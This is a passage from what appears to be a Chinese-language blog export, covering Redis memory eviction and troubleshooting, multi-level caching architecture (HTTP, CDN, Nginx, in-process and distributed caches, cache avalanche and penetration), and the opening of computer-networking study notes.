<p>&emsp;&emsp;具体实现时，Redis 遍历每一个 db，从每一个 db 中随机抽取一批样本 <em>key</em> ，默认是<code>3</code>个 <em>key</em> ，再从这 3 个 <em>key</em> 中，删除最近最少使用的 <em>key</em>。实现伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keys = getSomeKeys(dict, sample)</span><br><span class="line">key = findSmallestIdle(keys)</span><br><span class="line">remove(key)</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>3</code>这个数字是配置文件中的<code>maxmeory-samples</code>字段，也是可以可以设置采样的大小，如果设置为<code>10</code>，那么效果会更好，不过也会耗费更多的 CPU 资源。</p>
<h2 id="如何证明故障是不是由内存回收机制引起的？"><a href="#如何证明故障是不是由内存回收机制引起的？" class="headerlink" title="如何证明故障是不是由内存回收机制引起的？"></a>如何证明故障是不是由内存回收机制引起的？</h2><p>如果<code>set</code>没有报错，但是不生效，只有两种情况：</p>
<ol>
<li>设置的过期时间过短，比如，<code>1 s</code> ？</li>
<li>内存超过了最大限制，且设置的是<code>noeviction</code>或者<code>allkeys-random</code>。</li>
</ol>
<p>&emsp;&emsp;因此，在遇到这种情况，首先看<code>set</code>的时候是否加了过期时间，且过期时间是否合理，如果过期时间较短，那么应该检查一下设计是否合理。<br>&emsp;&emsp;如果过期时间没问题，那就需要查看 Redis 的内存使用率，查看 Redis 的配置文件或者在 Redis 中使用<code>info</code>命令查看 Redis 的状态，<code>maxmemory</code>属性查看最大内存值。如果是<code>0</code>，则<strong>没有限制</strong>，此时是通过<code>total_system_memory</code>限制，对比<code>used_memory</code>与 Redis 最大内存，查看内存使用率。<br>&emsp;&emsp;如果当前的内存使用率较大，那么就需要查看是否有配置最大内存，如果有且内存超了，那么就可以初步判定是内存回收机制导致 <em>key</em> 设置不成功，还需要查看内存淘汰算法是否<code>noeviction</code>或者<code>allkeys-random</code>，如果是，则可以确认是 Redis 的内存回收机制导致。如果内存没有超，或者内存淘汰算法不是上面的两者，则还需要看看 <em>key</em> 是否已经过期，通过<code>ttl</code>查看 <em>key</em> 的存活时间。如果运行了程序，<code>set</code>没有报错，则<code>ttl</code>应该马上更新，否则说明<code>set</code>失败，如果<code>set</code>失败了那么就应该查看操作的程序代码是否正确了。</p>
<figure class="image-box">
                <img src="16b8861a1fd184c4.png" alt title class>
                <p></p>
            </figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;Redis 对于内存的回收有两种方式，一种是过期 <em>key</em> 的回收，另一种是超过 Redis 的最大内存后的内存释放。  </p>
<p>对于第一种情况，Redis 会在：</p>
<ol>
<li>每一次访问的时候判断 <em>key</em> 的过期时间是否到达，如果到达，就删除 <em>key</em>。</li>
<li>Redis 启动时会创建一个定时事件，会定期清理部分过期的 <em>key</em> ，默认是每秒执行十次检查，每次过期 <em>key</em> 清理的时间不超过 CPU 时间的<code>25 %</code>，即若<code>hz = 1</code>，则一次清理时间最大为<code>250 ms</code>，若<code>hz = 10</code>，则一次清理时间最大为<code>25 ms</code>。</li>
</ol>
<p>&emsp;&emsp;对于第二种情况，Redis 会在每次处理 Redis 命令的时候判断当前 Redis 是否达到了内存的最大限制，如果达到限制，则使用对应的算法去处理需要删除的 <em>key</em>。</p>
<figure class="image-box">
                <img src="16b8864849e53986.png" alt title class>
                <p></p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一篇文章让你明白你多级缓存的分层架构]]></title>
      <url>/2019/12/30/MultiCacheLayeredArchitecture/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://juejin.im/post/5d86cf7f6fb9a06b211724e7" target="_blank" rel="noopener">https://juejin.im/post/5d86cf7f6fb9a06b211724e7</a>  </p>
</blockquote>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;在互联网高速发展的今天，缓存技术被广泛地应用。无论业内还是业外，只要是提到性能问题，大家都会脱口而出“用缓存解决”。<br>&emsp;&emsp;这种说法带有片面性，甚至是一知半解，但是作为专业人士的我们，需要对缓存有更深、更广的了解。<br>&emsp;&emsp;缓存技术存在于应用场景的方方面面。从浏览器请求，到反向代理服务器，从进程内缓存到分布式缓存。其中缓存策略，算法也是层出不穷，今天就带大家走进缓存。  </p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>&emsp;&emsp;缓存对于每个开发者来说是相当熟悉了，为了提高程序的性能我们会去加缓存，但是在什么地方加缓存，如何加缓存呢？<br>&emsp;&emsp;假设一个网站，需要提高性能，缓存可以放在浏览器，可以放在反向代理服务器，还可以放在应用程序进程内，同时可以放在分布式缓存系统中。</p>
<figure class="image-box">
                <img src="16d569bf41466257.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;从用户请求数据到数据返回，数据经过了浏览器，CDN，代理服务器，应用服务器，以及数据库各个环节。每个环节都可以运用缓存技术。<br>&emsp;&emsp;从浏览器/客户端开始请求数据，通过 HTTP 配合 CDN 获取数据的变更情况，到达代理服务器（Nginx）可以通过反向代理获取静态资源。<br>&emsp;&emsp;再往下来到应用服务器可以通过进程内（堆内）缓存，分布式缓存等递进的方式获取数据。如果以上所有缓存都没有命中数据，才会回源到数据库。<br>&emsp;&emsp;缓存的请求顺序是：用户请求 → HTTP 缓存 → CDN 缓存 → 代理服务器缓存 → 进程内缓存 → 分布式缓存 → 数据库。<br>&emsp;&emsp;看来在技术的架构每个环节都可以加入缓存，看看每个环节是如何应用缓存技术的。</p>
<h2 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h2><p>&emsp;&emsp;当用户通过浏览器请求服务器的时候，会发起 HTTP 请求，如果对每次 HTTP 请求进行缓存，那么可以减少应用服务器的压力。<br>&emsp;&emsp;当第一次请求的时候，浏览器本地缓存库没有缓存数据，会从服务器取数据，并且放到浏览器的缓存库中，下次再进行请求的时候会根据缓存的策略来读取本地或者服务的信息。</p>
<figure class="image-box">
                <img src="16d569d5d7c2e491.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;一般信息的传递通过 HTTP 请求头 Header 来传递。目前比较常见的缓存方式有两种，分别是：</p>
<ul>
<li>强制缓存</li>
<li>对比缓存</li>
</ul>
<h3 id="强制缓存"><a href="#强制缓存" class="headerlink" title="强制缓存"></a>强制缓存</h3><p>&emsp;&emsp;当浏览器本地缓存库保存了缓存信息，在缓存数据未失效的情况下，可以直接使用缓存数据。否则就需要重新获取数据。<br>&emsp;&emsp;这种缓存机制看上去比较直接，那么如何判断缓存数据是否失效呢？这里需要关注 HTTP Header 中的两个字段 Expires 和 Cache-Control。  </p>
<p>&emsp;&emsp;Expires 为服务端返回的过期时间，客户端第一次请求服务器，服务器会返回资源的过期时间。如果客户端再次请求服务器，会把请求时间与过期时间做比较。<br>&emsp;&emsp;如果请求时间小于过期时间，那么说明缓存没有过期，则可以直接使用本地缓存库的信息。<br>&emsp;&emsp;反之，说明数据已经过期，必须从服务器重新获取信息，获取完毕又会更新最新的过期时间。<br>&emsp;&emsp;这种方式在 HTTP 1.0 用的比较多，到了 HTTP 1.1 会使用 Cache-Control 替代。  </p>
<p>&emsp;&emsp;Cache-Control 中有个 max-age 属性，单位是秒，用来表示缓存内容在客户端的过期时间。<br>&emsp;&emsp;例如：max-age 是 60 秒，当前缓存没有数据，客户端第一次请求完后，将数据放入本地缓存。<br>&emsp;&emsp;那么在 60 秒以内客户端再发送请求，都不会请求应用服务器，而是从本地缓存中直接返回数据。如果两次请求相隔时间超过了 60 秒，那么就需要通过服务器获取数据。</p>
<h3 id="对比缓存"><a href="#对比缓存" class="headerlink" title="对比缓存"></a>对比缓存</h3><p>&emsp;&emsp;需要对比前后两次的缓存标志来判断是否使用缓存。浏览器第一次请求时，服务器会将缓存标识与数据一起返回，浏览器将二者备份至本地缓存库中。浏览器再次请求时，将备份的缓存标识发送给服务器。<br>&emsp;&emsp;服务器根据缓存标识进行判断，如果判断数据没有发生变化，把判断成功的 304 状态码发给浏览器。<br>&emsp;&emsp;这时浏览器就可以使用缓存的数据来。服务器返回的就只是 Header，不包含 Body。<br>&emsp;&emsp;下面介绍两种标识规则：</p>
<h4 id="Last-Modified-If-Modified-Since-规则"><a href="#Last-Modified-If-Modified-Since-规则" class="headerlink" title="Last-Modified/If-Modified-Since 规则"></a>Last-Modified/If-Modified-Since 规则</h4><p>&emsp;&emsp;在客户端第一次请求的时候，服务器会返回资源最后的修改时间，记作 Last-Modified。客户端将这个字段连同资源缓存起来。<br>&emsp;&emsp;Last-Modified 被保存以后，在下次请求时会以 Last-Modified-Since 字段被发送。</p>
<figure class="image-box">
                <img src="16d569f93a310b24.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;当客户端再次请求服务器时，会把 Last-Modified 连同请求的资源一起发给服务器，这时 Last-Modified 会被命名为 If-Modified-Since，存放的内容都是一样的。  </p>
<p>&emsp;&emsp;服务器收到请求，会把 If-Modified-Since 字段与服务器上保存的 Last-Modified 字段作比较：</p>
<ul>
<li>若服务器上的 Last-Modified 最后修改时间大于请求的 If-Modified-Since，说明资源被改动过，就会把资源（包括 Header+Body）重新返回给浏览器，同时返回状态码 200。</li>
<li>若资源的最后修改时间小于或等于 If-Modified-Since，说明资源没有改动过，只会返回 Header，并且返回状态码 304。浏览器接受到这个消息就可以使用本地缓存库的数据。<figure class="image-box">
                <img src="16d569ff7f715d6c.png" alt title class>
                <p></p>
            </figure>

</li>
</ul>
<p>&emsp;&emsp;注意：Last-Modified 和 If-Modified-Since 指的是同一个值，只是在客户端和服务器端的叫法不同。</p>
<h4 id="ETag-If-None-Match-规则"><a href="#ETag-If-None-Match-规则" class="headerlink" title="ETag / If-None-Match 规则"></a>ETag / If-None-Match 规则</h4><p>&emsp;&emsp;客户端第一次请求的时候，服务器会给每个资源生成一个 ETag 标记。这个 ETag 是根据每个资源生成的唯一 Hash 串，资源如何发生变化 ETag 随之更改，之后将这个 ETag 返回给客户端，客户端把请求的资源和 ETag 都缓存到本地。<br>&emsp;&emsp;ETag 被保存以后，在下次请求时会当作 If-None-Match 字段被发送出去。</p>
<figure class="image-box">
                <img src="16d56a0c8af412a0.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在浏览器第二次请求服务器相同资源时，会把资源对应的 ETag 一并发送给服务器。在请求时 ETag 转化成 If-None-Match，但其内容不变。  </p>
<p>&emsp;&emsp;服务器收到请求后，会把 If-None-Match 与服务器上资源的 ETag 进行比较：</p>
<ul>
<li>如果不一致，说明资源被改动过，则返回资源（Header + Body），返回状态码 200。</li>
<li>如果一致，说明资源没有被改过，则返回 Header，返回状态码 304。浏览器接受到这个消息就可以使用本地缓存库的数据。<figure class="image-box">
                <img src="16d56a153619a1fd.png" alt title class>
                <p></p>
            </figure>

</li>
</ul>
<p>&emsp;&emsp;注意：ETag 和 If-None-Match 指的是同一个值，只是在客户端和服务器端的叫法不同。</p>
<h2 id="CDN-缓存"><a href="#CDN-缓存" class="headerlink" title="CDN 缓存"></a>CDN 缓存</h2><p>&emsp;&emsp;HTTP 缓存主要是对静态数据进行缓存，把从服务器拿到的数据缓存到客户端/浏览器。<br>&emsp;&emsp;如果在客户端和服务器之间再加上一层 CDN，可以让 CDN 为应用服务器提供缓存，如果在 CDN 上缓存，就不用再请求应用服务器了。并且 HTTP 缓存提到的两种策略同样可以在 CDN 服务器执行。<br>&emsp;&emsp;CDN 的全称是 Content Delivery Network，即内容分发网络。</p>
<figure class="image-box">
                <img src="16d56a1fd2c18f06.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;让我们来看看它是如何工作的吧：</p>
<ul>
<li>客户端发送 URL 给 DNS 服务器。</li>
<li>DNS 通过域名解析，把请求指向 CDN 网络中的 DNS 负载均衡器。</li>
<li>DNS 负载均衡器将最近 CDN 节点的 IP 告诉 DNS，DNS 告之客户端最新 CDN 节点的 IP。</li>
<li>客户端请求最近的 CDN 节点。</li>
<li>CDN 节点从应用服务器获取资源返回给客户端，同时将静态信息缓存。注意：客户端下次互动的对象就是 CDN 缓存了，CDN 可以和应用服务器同步缓存信息。</li>
</ul>
<p>&emsp;&emsp;CDN 接受客户端的请求，它就是离客户端最近的服务器，它后面会链接多台服务器，起到了缓存和负载均衡的作用。</p>
<h2 id="负载均衡缓存"><a href="#负载均衡缓存" class="headerlink" title="负载均衡缓存"></a>负载均衡缓存</h2><p>&emsp;&emsp;说完客户端（HTTP）缓存和 CDN 缓存，我们离应用服务越来越近了，在到达应用服务之前，请求还要经过负载均衡器。<br>&emsp;&emsp;虽说它的主要工作是对应用服务器进行负载均衡，但是它也可以作缓存。可以把一些修改频率不高的数据缓存在这里，例如：用户信息，配置信息。通过服务定期刷新这个缓存就行了。</p>
<figure class="image-box">
                <img src="16d56a30046ad729.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;以 Nginx 为例，我们看看它是如何工作的：</p>
<ul>
<li>用户请求在达到应用服务器之前，会先访问 Nginx 负载均衡器，如果发现有缓存信息，直接返回给用户。</li>
<li>如果没有发现缓存信息，Nginx 回源到应用服务器获取信息。</li>
<li>另外，有一个缓存更新服务，定期把应用服务器中相对稳定的信息更新到 Nginx 本地缓存中。</li>
</ul>
<h2 id="进程内缓存"><a href="#进程内缓存" class="headerlink" title="进程内缓存"></a>进程内缓存</h2><p>&emsp;&emsp;通过了客户端，CDN，负载均衡器，我们终于来到了应用服务器。应用服务器上部署着一个个应用，这些应用以进程的方式运行着，那么在进程中的缓存是怎样的呢？<br>&emsp;&emsp;进程内缓存又叫托管堆缓存，以 Java 为例，这部分缓存放在 JVM 的托管堆上面，同时会受到托管堆回收算法的影响。<br>&emsp;&emsp;由于其运行在内存中，对数据的响应速度很快，通常我们会把热点数据放在这里。<br>&emsp;&emsp;在进程内缓存没有命中的时候，我们会去搜索进程外的缓存或者分布式缓存。这种缓存的好处是没有序列化和反序列化，是最快的缓存。缺点是缓存的空间不能太大，对垃圾回收器的性能有影响。<br>&emsp;&emsp;目前比较流行的实现有 Ehcache、GuavaCache、Caffeine。这些架构可以很方便的把一些热点数据放到进程内的缓存中。  </p>
<p>&emsp;&emsp;这里我们需要关注几个缓存的回收策略，具体的实现架构的回收策略会有所不同，但大致的思路都是一致的：</p>
<ul>
<li>FIFO（First In First Out）：先进先出算法，最先放入缓存的数据最先被移除。</li>
<li>LRU（Least Recently Used）：最近最少使用算法，把最久没有使用过的数据移除缓存。</li>
<li>LFU（Least Frequently Used）：最不常用算法，在一段时间内使用频率最小的数据被移除缓存。</li>
</ul>
<p>&emsp;&emsp;在分布式架构的今天，多应用中如果采用进程内缓存会存在数据一致性的问题。  </p>
<p>&emsp;&emsp;这里推荐两个方案：</p>
<ul>
<li>消息队列修改方案</li>
<li>Timer 修改方案</li>
</ul>
<h3 id="消息队列修改方案"><a href="#消息队列修改方案" class="headerlink" title="消息队列修改方案"></a>消息队列修改方案</h3><p>&emsp;&emsp;应用在修改完自身缓存数据和数据库数据之后，给消息队列发送数据变化通知，其他应用订阅了消息通知，在收到通知的时候修改缓存数据。</p>
<figure class="image-box">
                <img src="16d56a6dbc364fd3.png" alt title class>
                <p></p>
            </figure>

<h3 id="Timer-修改方案"><a href="#Timer-修改方案" class="headerlink" title="Timer 修改方案"></a>Timer 修改方案</h3><p>&emsp;&emsp;为了避免耦合，降低复杂性，对“实时一致性”不敏感的情况下。每个应用都会启动一个 Timer，定时从数据库拉取最新的数据，更新缓存。<br>&emsp;&emsp;不过在有的应用更新数据库后，其他节点通过 Timer 获取数据之间，会读到脏数据。这里需要控制好 Timer 的频率，以及应用与对实时性要求不高的场景。</p>
<figure class="image-box">
                <img src="16d56a747c2c91b9.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;进程内缓存有哪些使用场景呢？</p>
<ul>
<li>场景一：只读数据，可以考虑在进程启动时加载到内存。当然，把数据加载到类似 Redis 这样的进程外缓存服务也能解决这类问题。</li>
<li>场景二：高并发，可以考虑使用进程内缓存，例如：秒杀。</li>
</ul>
<h2 id="分布式缓存"><a href="#分布式缓存" class="headerlink" title="分布式缓存"></a>分布式缓存</h2><p>&emsp;&emsp;说完进程内缓存，自然就过度到进程外缓存了。与进程内缓存不同，进程外缓存在应用运行的进程之外，它拥有更大的缓存容量，并且可以部署到不同的物理节点，通常会用分布式缓存的方式实现。<br>&emsp;&emsp;分布式缓存是与应用分离的缓存服务，最大的特点是，自身是一个独立的应用/服务，与本地应用隔离，多个应用可直接共享一个或者多个缓存应用/服务。</p>
<figure class="image-box">
                <img src="16d56a81b9116323.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;既然是分布式缓存，缓存的数据会分布到不同的缓存节点上，每个缓存节点缓存的数据大小通常也是有限制的。<br>&emsp;&emsp;数据被缓存到不同的节点，为了能方便的访问这些节点，需要引入缓存代理，类似 Twemproxy。他会帮助请求找到对应的缓存节点。<br>&emsp;&emsp;同时如果缓存节点增加了，这个代理也会只能识别并且把新的缓存数据分片到新的节点，做横向的扩展。<br>&emsp;&emsp;为了提高缓存的可用性，会在原有的缓存节点上加入 Master / Slave 的设计。当缓存数据写入 Master 节点的时候，会同时同步一份到 Slave 节点。<br>&emsp;&emsp;一旦 Master 节点失效，可以通过代理直接切换到 Slave 节点，这时 Slave 节点就变成了 Master 节点，保证缓存的正常工作。<br>&emsp;&emsp;每个缓存节点还会提供缓存过期的机制，并且会把缓存内容定期以快照的方式保存到文件上，方便缓存崩溃之后启动预热加载。</p>
<h3 id="高性能"><a href="#高性能" class="headerlink" title="高性能"></a>高性能</h3><p>&emsp;&emsp;当缓存做成分布式的时候，数据会根据一定的规律分配到每个缓存应用/服务上。<br>&emsp;&emsp;如果我们把这些缓存应用/服务叫做缓存节点，每个节点一般都可以缓存一定容量的数据，例如：Redis 一个节点可以缓存 2 GB 的数据。<br>&emsp;&emsp;如果需要缓存的数据量比较大就需要扩展多个缓存节点来实现，这么多的缓存节点，客户端的请求不知道访问哪个节点怎么办？缓存的数据又如何放到这些节点上？<br>&emsp;&emsp;缓存代理服务已经帮我们解决这些问题了，例如：Twemproxy 不但可以帮助缓存路由，同时可以管理缓存节点。<br>&emsp;&emsp;这里有介绍三种缓存数据分片的算法，有了这些算法缓存代理就可以方便的找到分片的数据了。</p>
<h4 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h4><p>&emsp;&emsp;Hash 表是最常见的数据结构，实现方式是，对数据记录的关键值进行 Hash，然后再对需要分片的缓存节点个数进行取模得到的余数进行数据分配。<br>&emsp;&emsp;例如：有三条记录数据分别是 R1，R2，R3。他们的 ID 分别是 01，02，03，假设对这三个记录的 ID 作为关键值进行 Hash 算法之后的结果依旧是 01，02，03。<br>&emsp;&emsp;我们想把这三条数据放到三个缓存节点中，可以把这个结果分别对 3 这个数字取模得到余数，这个余数就是这三条记录分别放置的缓存节点。</p>
<figure class="image-box">
                <img src="16d56a94217adb7b.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Hash 算法是某种程度上的平均放置，策略比较简单，如果要增加缓存节点，对已经存在的数据会有较大的变动。</p>
<h4 id="一致性哈希算法"><a href="#一致性哈希算法" class="headerlink" title="一致性哈希算法"></a>一致性哈希算法</h4><p>&emsp;&emsp;一致性 Hash 是将数据按照特征值映射到一个首尾相接的 Hash 环上，同时也将缓存节点映射到这个环上。<br>&emsp;&emsp;如果要缓存数据，通过数据的关键值（Key）在环上找到自己存放的位置。这些数据按照自身的 ID 取 Hash 之后得到的值按照顺序在环上排列。</p>
<figure class="image-box">
                <img src="16d56a9d134c1e6a.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如果这个时候要插入一条新的数据其 ID 是 115，那么就应该插入到如下图的位置。</p>
<figure class="image-box">
                <img src="16d56aa0797af888.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;同理如果要增加一个缓存节点 N4 150，也可以放到如下图的位置。</p>
<figure class="image-box">
                <img src="16d56aaa9c001ed7.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这种算法对于增加缓存数据，和缓存节点的开销相对比较小。</p>
<h4 id="Range-Based-算法"><a href="#Range-Based-算法" class="headerlink" title="Range Based 算法"></a>Range Based 算法</h4><p>&emsp;&emsp;这种方式是按照关键值（例如 ID）将数据划分成不同的区间，每个缓存节点负责一个或者多个区间。跟一致性哈希有点像。<br>&emsp;&emsp;例如：存在三个缓存节点分别是 N1，N2，N3。他们用来存放数据的区间分别是，N1(0, 100]， N2(100, 200]， N3(300, 400]。<br>&emsp;&emsp;那么数据根据自己 ID 作为关键字做 Hash 以后的结果就会分别对应放到这几个区域里面了。</p>
<h3 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h3><p>&emsp;&emsp;根据事物的两面性，在分布式缓存带来高性能的同时，我们也需要重视它的可用性。那么哪些潜在的风险是我们需要防范的呢？</p>
<h4 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h4><p>&emsp;&emsp;当缓存失效，缓存过期被清除，缓存更新的时候。请求是无法命中缓存的，这个时候请求会直接回源到数据库。<br>&emsp;&emsp;如果上述情况频繁发生或者同时发生的时候，就会造成大面积的请求直接到数据库，造成数据库访问瓶颈。我们称这种情况为缓存雪崩。  </p>
<p>&emsp;&emsp;从如下两方面来思考解决方案：  </p>
<p>&emsp;&emsp;缓存方面：</p>
<ul>
<li>避免缓存同时失效，不同的 key 设置不同的超时时间。</li>
<li>增加互斥锁，对缓存的更新操作进行加锁保护，保证只有一个线程进行缓存更新。缓存一旦失效可以通过缓存快照的方式迅速重建缓存。对缓存节点增加主备机制，当主缓存失效以后切换到备用缓存继续工作。</li>
</ul>
<p>&emsp;&emsp;设计方面，这里给出了几点建议供大家参考：</p>
<ul>
<li>熔断机制：某个缓存节点不能工作的时候，需要通知缓存代理不要把请求路由到该节点，减少用户等待和请求时长。</li>
<li>限流机制：在接入层和代理层可以做限流，当缓存服务无法支持高并发的时候，前端可以把无法响应的请求放入到队列或者丢弃。</li>
<li>隔离机制：缓存无法提供服务或者正在预热重建的时候，把该请求放入队列中，这样该请求因为被隔离就不会被路由到其他的缓存节点。</li>
</ul>
<p>&emsp;&emsp;如此就不会因为这个节点的问题影响到其他节点。当缓存重建以后，再从队列中取出请求依次处理。</p>
<h4 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h4><p>&emsp;&emsp;缓存一般是 Key，Value 方式存在，一个 Key 对应的 Value 不存在时，请求会回源到数据库。<br>&emsp;&emsp;假如对应的 Value 一直不存在，则会频繁的请求数据库，对数据库造成访问压力。如果有人利用这个漏洞攻击，就麻烦了。  </p>
<p>&emsp;&emsp;解决方法：如果一个 Key 对应的 Value 查询返回为空，我们仍然把这个空结果缓存起来，如果这个值没有变化下次查询就不会请求数据库了。<br>&emsp;&emsp;将所有可能存在的数据哈希到一个足够大的 Bitmap 中，那么不存在的数据会被这个 Bitmap 过滤器拦截掉，避免对数据库的查询压力。</p>
<h4 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h4><p>&emsp;&emsp;在数据请求的时候，某一个缓存刚好失效或者正在写入缓存，同时这个缓存数据可能会在这个时间点被超高并发请求，成为“热点”数据。<br>&emsp;&emsp;这就是缓存击穿问题，这个和缓存雪崩的区别在于，这里是针对某一个缓存，前者是针对多个缓存。  </p>
<p>&emsp;&emsp;解决方案：导致问题的原因是在同一时间读/写缓存，所以只有保证同一时间只有一个线程写，写完成以后，其他的请求再使用缓存就可以了。<br>&emsp;&emsp;比较常用的做法是使用 mutex（互斥锁）。在缓存失效的时候，不是立即写入缓存，而是先设置一个 mutex（互斥锁）。当缓存被写入完成以后，再放开这个锁让请求进行访问。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>总结一下，缓存设计有五大策略，从用户请求开始依次是：</p>
<ol>
<li>HTTP 缓存</li>
<li>CDN 缓存</li>
<li>负载均衡缓存</li>
<li>进程内缓存</li>
<li>分布式缓存</li>
</ol>
<p>其中，前两种缓存静态数据，后三种缓存动态数据：</p>
<ul>
<li>HTTP 缓存包括强制缓存和对比缓存。</li>
<li>CDN 缓存和 HTTP 缓存是好搭档。</li>
<li>负载均衡器缓存相对稳定资源，需要服务协助工作。</li>
<li>进程内缓存，效率高，但容量有限制，有两个方案可以应对缓存同步的问题。</li>
<li>分布式缓存容量大，能力强，牢记三个性能算法并且防范三个缓存风险。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
            <tag> Web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[学习计算机网络]]></title>
      <url>/2019/12/30/LearningComputerNetworks/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/cxuanBlog/p/12177976.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxuanBlog/p/12177976.html</a><br><a href="https://juejin.im/post/5ba65296f265da0ac8493503" target="_blank" rel="noopener">https://juejin.im/post/5ba65296f265da0ac8493503</a><br><a href="https://juejin.im/post/5cd0438c6fb9a031ec6d3ab2" target="_blank" rel="noopener">https://juejin.im/post/5cd0438c6fb9a031ec6d3ab2</a><br><a href="https://www.jianshu.com/p/be29d679cbff" target="_blank" rel="noopener">https://www.jianshu.com/p/be29d679cbff</a><br><a href="https://baike.baidu.com/item/HTTP状态码/5053660" target="_blank" rel="noopener">https://baike.baidu.com/item/HTTP状态码/5053660</a></p>
</blockquote>
<blockquote>
<p>计算机网络基础：<a href="https://juejin.im/post/5dc77d806fb9a04ab94e1563" target="_blank" rel="noopener">https://juejin.im/post/5dc77d806fb9a04ab94e1563</a><br>应用层：<a href="https://juejin.im/post/5de32715f265da06095c7334" target="_blank" rel="noopener">https://juejin.im/post/5de32715f265da06095c7334</a><br>HTTP 协议：<a href="https://juejin.im/post/5dfc8af6f265da33ec7dbca4" target="_blank" rel="noopener">https://juejin.im/post/5dfc8af6f265da33ec7dbca4</a><br>HTTPS 与追加协议：<a href="https://juejin.im/post/5e02d94251882512842197ed" target="_blank" rel="noopener">https://juejin.im/post/5e02d94251882512842197ed</a><br>Web 攻击与防御：<a href="https://juejin.im/post/5e041d4d518825124953fcd5" target="_blank" rel="noopener">https://juejin.im/post/5e041d4d518825124953fcd5</a>  </p>
</blockquote>
<a id="more"></a>

<figure class="image-box">
                <img src="16f4685e332d4a4b.png" alt title class>
                <p></p>
            </figure>

<h1 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li>学习资料来源于 <em>《计算机网络》（第七版）</em> 和 <em>《图解 HTTP》</em>。</li>
<li>本篇主要分享互联网概述，计算机网络体系结构等知识。</li>
</ul>
<h2 id="互连网与互联网的区别"><a href="#互连网与互联网的区别" class="headerlink" title="互连网与互联网的区别"></a>互连网与互联网的区别</h2><h3 id="互连网"><a href="#互连网" class="headerlink" title="互连网"></a>互连网</h3><ul>
<li>与网络相连的计算机称为主机。智能手机也可以称为主机。</li>
<li>结点可以是<strong>计算机</strong>，<strong>集成器</strong>，<strong>交换机</strong>，<strong>路由器</strong>等。</li>
<li>计算机网络（简称网络）由<strong>若干结点</strong>和连接这些结点的<strong>链路</strong>组成。</li>
<li><strong>互连网</strong>：网络之间可以通过路由器互连起来，这就构成一个覆盖范围更大的计算机网络。</li>
<li><strong>互连网是“网络的网络”</strong>，泛指由多个计算机网络互连而成的计算机网络。网络把许多计算机连接在一起。而<strong>互连网</strong>把许多网络通过路由器连接在一起。</li>
</ul>
<h3 id="互联网"><a href="#互联网" class="headerlink" title="互联网"></a>互联网</h3><ul>
<li>也叫做因特网，不过现在不用了。</li>
<li>互联网（专有名词）：指当前<strong>全球最大的</strong>，开放的，由众多网络相互连接而成的特定<strong>互连网</strong>。</li>
<li>这也是为什么 1994 年中国接入互联网叫做<strong>接入</strong>，而不是其他动词。</li>
<li>采用 <strong>TCP/IP</strong> 协议族作为通信的规则，前身是<code>ARPANET</code>。</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>计算机，交换机，路由器等 = 结点</li>
<li>结点 + 链路 = 网络</li>
<li>网络 + 网络 = 互连网</li>
<li>互联网 = 全球最大的互连网</li>
</ul>
<figure class="image-box">
                <img src="16e53aaeea02db07.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="互联网发展的几个阶段"><a href="#互联网发展的几个阶段" class="headerlink" title="互联网发展的几个阶段"></a>互联网发展的几个阶段</h2><ul>
<li>第一阶段：1969 美国国防部创建的第一个分组交换网<code>ARPANET</code>（并不是一个互连的网络）。所有要连接在<code>ARPANET</code>上的主机都直接与最近的结点交换机相连。</li>
<li>第二阶段：20 世纪 70 年代中期，开始研究<strong>多种网络互连的技术</strong>，导致互连网络的出现。互联网的雏形。</li>
<li>第三阶段：1983 年，<code>TCP/IP</code>协议成为<code>ARPANET</code>上的标准协议，使所有使用<code>TCP/IP</code>协议的计算机都能利用互联网相互通信。互联网诞生。</li>
<li>第四阶段：1985 年。建成了三级结构的互联网<code>NSFNET</code>。分为主干网，地区网，校园网。基本覆盖了全美国主要的大学和研究所。</li>
